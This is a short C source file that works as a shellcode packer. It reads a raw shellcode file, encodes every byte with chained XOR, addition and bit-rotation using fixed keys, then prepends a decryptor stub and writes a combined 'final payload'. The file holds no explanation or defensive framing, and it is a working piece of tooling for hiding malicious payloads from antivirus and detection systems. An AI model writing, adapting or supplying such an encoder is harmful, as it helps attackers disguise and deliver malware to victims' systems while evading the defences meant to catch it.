#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

void xor_encrypt(uint8_t* data, size_t len, uint8_t key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

void add_encrypt(uint8_t* data, size_t len, uint8_t key) {
    for (size_t i = 0; i < len; i++) {
        data[i] = (uint8_t)(data[i] + key);
    }
}

uint8_t rol_byte(uint8_t b, uint8_t bits) {
    return (b << bits) | (b >> (8 - bits));
}

void rol_encrypt(uint8_t* data, size_t len, uint8_t bits) {
    for (size_t i = 0; i < len; i++) {
        data[i] = rol_byte(data[i], bits);
    }
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        printf("Usage: %s shellcode.bin decryptor.bin final_payload.bin\n", argv[0]);
        return 1;
    }

    const char* shellcode_file = argv[1];
    const char* decryptor_file = argv[2];
    const char* output_file = argv[3];

    FILE* f_shell = fopen(shellcode_file, "rb");
    if (!f_shell) {
        perror("Failed to open shellcode file");
        return 1;
    }
    fseek(f_shell, 0, SEEK_END);
    size_t shell_len = ftell(f_shell);
    rewind(f_shell);

    uint8_t* shellcode = malloc(shell_len);
    if (!shellcode) {
        perror("Malloc failed");
        fclose(f_shell);
        return 1;
    }
    fread(shellcode, 1, shell_len, f_shell);
    fclose(f_shell);

    // Encrypt shellcode
    xor_encrypt(shellcode, shell_len, 0xAA);
    add_encrypt(shellcode, shell_len, 0x10);
    rol_encrypt(shellcode, shell_len, 3);

    FILE* f_decryptor = fopen(decryptor_file, "rb");
    if (!f_decryptor) {
        perror("Failed to open decryptor file");
        free(shellcode);
        return 1;
    }
    fseek(f_decryptor, 0, SEEK_END);
    size_t decryptor_len = ftell(f_decryptor);
    rewind(f_decryptor);

    uint8_t* decryptor = malloc(decryptor_len);
    if (!decryptor) {
        perror("Malloc failed");
        fclose(f_decryptor);
        free(shellcode);
        return 1;
    }
    fread(decryptor, 1, decryptor_len, f_decryptor);
    fclose(f_decryptor);

    FILE* f_out = fopen(output_file, "wb");
    if (!f_out) {
        perror("Failed to open output file");
        free(shellcode);
        free(decryptor);
        return 1;
    }

    fwrite(decryptor, 1, decryptor_len, f_out);
    fwrite(shellcode, 1, shell_len, f_out);

    fclose(f_out);
    free(shellcode);
    free(decryptor);

    printf("Final payload written to %s\n", output_file);
    return 0;
}
